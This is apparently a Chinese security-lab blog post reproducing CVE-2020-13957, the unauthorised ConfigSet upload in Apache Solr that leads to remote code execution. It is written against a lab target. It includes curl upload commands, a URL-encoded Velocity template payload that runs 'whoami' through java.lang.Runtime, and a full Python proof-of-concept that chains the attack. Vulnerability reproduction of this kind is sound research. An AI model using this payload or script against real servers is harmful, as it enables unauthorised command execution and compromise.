> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/GRc9kNBvbyafTcN8bl6iAg)



声明：

由于传播、利用此文所提供的信息而造成的任何直接或者间接的后果及损失, 均由使用者本人负责, 雷石安全实验室以及文章作者不为此承担任何责任。

1、相关简介



**1.1、漏洞概述**

CVE-2020-13957, 在特定的 Solr 版本中 ConfigSet API 存在未授权上传漏洞, 攻击者利用该漏洞可实现远程代码执行。

**1.2、漏洞利用链**

上传 configset——基于 configset 再次上传 configset(跳过身份检测), 利用新 configset 创造 collection——利用 solrVelocity 模板进行 RCE。

**1.3、影响版本**

Apache Solr 6.6.0 -6.6.5

Apache Solr 7.0.0 -7.7.3

Apache Solr 8.0.0 -8.6.2

2、漏洞复现


**2.1、漏洞环境**

**solr 下载地址****：**

http://archive.apache.org/dist/lucene/solr/

这次复现使用的是 solr8.0.0 版本

**靶机：**

win10,IP 地址：192.168.94.130

**攻击机：**

kali



![](https://mmbiz.qpic.cn/mmbiz_png/RXib24CCXQ0icgJnwz55vaCiatpsqriaW2GZ01FvRCNODcaFwa35ObXRoJxVF3aPzAljmwqB7mRyHn2YJdMzxtSHCw/640?wx_fmt=png)

**2.2、环境搭建**

首先, 在 win10 靶机中解压 solr-8.0.0.zip, 然后在 cmd 中切换到 bin 目录下执行以下命令：

```
solr.cmd start -c
```

![](https://mmbiz.qpic.cn/mmbiz_png/RXib24CCXQ0icgJnwz55vaCiatpsqriaW2GZrJdtW0t94MNUTjtLFs9dWibHFnJA5xVZxvuyFicSluQOA9OicX4vlTJJw/640?wx_fmt=png)

如果是在 Linux 系统中搭建 solr 环境, 执行的命令为：

```
./solr start -e cloud -force
```

然后在 kali 的浏览器中打开 http://192.168.94.130:8983/,

solr 以 cloud 模式启动, 环境搭建成功.

![](https://mmbiz.qpic.cn/mmbiz_png/RXib24CCXQ0icgJnwz55vaCiatpsqriaW2GZ2m9D7icor8zJtuo5lN5Y9mkCxCd7ic3u2Vfmx3cybhCbvd600bOtT5rA/640?wx_fmt=png)

**2.3、漏洞复现**

首先在 kali 中解压 solr-8.0.0.zip, 切换到 server/solr/configsets/_default/conf / 目录, 找到 solrconfig.xml 文件, 并将 velocity.params.resource.loader.enabled 的 false 修改为 true, 即：

```
>${velocity.params.resource.loader.enabled:true}
```

![](https://mmbiz.qpic.cn/mmbiz_png/RXib24CCXQ0icgJnwz55vaCiatpsqriaW2GZKpmImY2sVHMsatPMOHv6bRvKxD51MCo63gM6SPAhenFxaIdKpw3ic5A/640?wx_fmt=png)

然后在

server/solr/configsets/_default/conf / 目录下打开终端, 执行以下命令将 conf 目录下所有文件打包成一个压缩文件 mytest.zip

```
zip -r - * > mytest.zip
```

![](https://mmbiz.qpic.cn/mmbiz_png/RXib24CCXQ0icgJnwz55vaCiatpsqriaW2GZMYnKibSibyASmHJianTGSG7rBKetQkH5Axbnty05geGfpfbWWMTHBoichQ/640?wx_fmt=png)

由于 ConfigSet API 存在未授权上传, 可以通过以下命令将 mytest.zip 上传

```
curl -X POST --header "Content-Type:application/octet-stream" --data-binary @mytest.zip "http://192.168.94.130:8983/solr/admin/configs?action=UPLOAD&
```

![](https://mmbiz.qpic.cn/mmbiz_png/RXib24CCXQ0icgJnwz55vaCiatpsqriaW2GZGJkIwJD4eYVxZLYI6bLOwzicC4bDhGgJpzcaXorwUqIGMoeGDNznMKA/640?wx_fmt=png)

根据 CREATE 得到的新 configset 创建恶意 collection

```
curl "http://192.168.94.130:8983/solr/admin/collections?action=CREATE&
```

![](https://mmbiz.qpic.cn/mmbiz_png/RXib24CCXQ0icgJnwz55vaCiatpsqriaW2GZ0LQAbfqV6NoNtJibViciaXucT9VWBNFPMhl9V3rkp7v3icXMcVjbeowPZA/640?wx_fmt=png)

在 kali 的浏览器中输入以下地址, 即可利用已上传的 collection 进行远程命令执行, 这里执行的是 whoami

```
http://192.168.94.130:8983/solr/mytest2/select?q=1&&wt=velocity&v.template=custom&v.template.custom=%23set($x=%27%27)+%23set($rt=$x.class.forName(%27java.lang.Runtime%27))+%23set($chr=$x.class.forName(%27java.lang.Character%27))+%23set($str=$x.class.forName(%27java.lang.String%27))+%23set($ex=$rt.getRuntime().exec(%27whoami%27))+$ex.waitFor()+%23set($out=$ex.getInputStream())+%23foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))%23end
```

![](https://mmbiz.qpic.cn/mmbiz_png/RXib24CCXQ0icgJnwz55vaCiatpsqriaW2GZ5uaw8Z97a4pAmZFvKAiamkF3AQLKOK43woufAvajULXSQzr8ibRCibtgg/640?wx_fmt=png)

whoami 执行成功了, 漏洞复现成功

3、编写验证 POC

**3.1、重新搭建环境**

回到 win10 靶机执行以下的 solr 停止命令, 然后将 solr8.0 整个文件夹删除

```
solr stop -p 8983
```

![](https://mmbiz.qpic.cn/mmbiz_png/RXib24CCXQ0icgJnwz55vaCiatpsqriaW2GZJoEKv1LNKicGrILSAKniaibcl8NARicdqa7nCmw3exzS2cJJAV6jPX2ibMg/640?wx_fmt=png)

重复 2.2 的环境搭建过程, 重新搭建漏洞环境, 重新在 win10 中启动 solr（这里试过如果不重新搭建漏洞环境, 再次验证漏洞时会出错）

![](https://mmbiz.qpic.cn/mmbiz_png/RXib24CCXQ0icgJnwz55vaCiatpsqriaW2GZWRthoccaDdVZkc3pcOZAcV3jcweu2RjkMs8TEWciclGzJQXgWaJAlrQ/640?wx_fmt=png)

**3.2、执行编写好的 POC**

先编写一个能验证漏洞存在的简单 POC, 如下：

```python
#!/usr/bin/python3
#coding=utf-8


import requests


def testPoc(url):
try:
urls = url + '/solr/admin/configs?action=UPLOAD&name=mytest'
files = {
'file':('mytest.zip',open('mytest.zip','rb'),'application/octet-stream')
}
headers = {
'User-Agent':'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36'
}
response = requests.post(url=urls,headers=headers,files=files)
if response.status_code == 200:
print('上传成功')
else:
print('上传出错')
urls = url + '/solr/admin/collections?action=CREATE&name=mytest2&numShards=1&replicationFactor=1&wt=xml&collection.configName=mytest'
response = requests.get(url=urls,headers=headers)
if response.status_code == 200:
#print(response.text)
print('创建成功')
else:
print('创建失败')


urls = url + '/solr/mytest2/select?q=1&&wt=velocity&v.template=custom&v.template.custom=%23set($x=%27%27)+%23set($rt=$x.class.forName(%27java.lang.Runtime%27))+%23set($chr=$x.class.forName(%27java.lang.Character%27))+%23set($str=$x.class.forName(%27java.lang.String%27))+%23set($ex=$rt.getRuntime().exec(%27whoami%27))+$ex.waitFor()+%23set($out=$ex.getInputStream())+%23foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))%23end'
response = requests.get(url=urls,headers=headers)
if response.status_code == 200:
print(response.text)
print('----------------存在漏洞---------------')
else:
print('----------------不存在漏洞')


except Exception as e:
print(e)


url = 'http://192.168.94.130:8983'
testPoc(url)


print('程序执行结束')
```

将编写好的 poc.py 文件放到 kali 的 mytest.zip 文件所在目录下

![](https://mmbiz.qpic.cn/mmbiz_png/RXib24CCXQ0icgJnwz55vaCiatpsqriaW2GZiaK7Pa5glbq18kfB4jyBCUBbdEyBkIIwlWl6cHv0QRvRY2xOplAhOAw/640?wx_fmt=png)

在当前目录打开终端, 执行编写好的 python 脚本验证漏洞即可：

![](https://mmbiz.qpic.cn/mmbiz_png/RXib24CCXQ0icgJnwz55vaCiatpsqriaW2GZuPlIiaE30vibsxQ4usDaO9j64rahDHPjXffbiaR98tJ6GzUQMd44gEcXQ/640?wx_fmt=png)





4、总结



本次漏洞复现中遇到不少问题, 比如其他大佬的漏洞复现文章中, 有一个根据 UPLOAD 的配置, 创建一个新的配置的命令, 这里并没有执行也复现成功了。然后每次验证过漏洞存在时, 都需要重新搭建环境等等。。菜鸟继续加油哇～

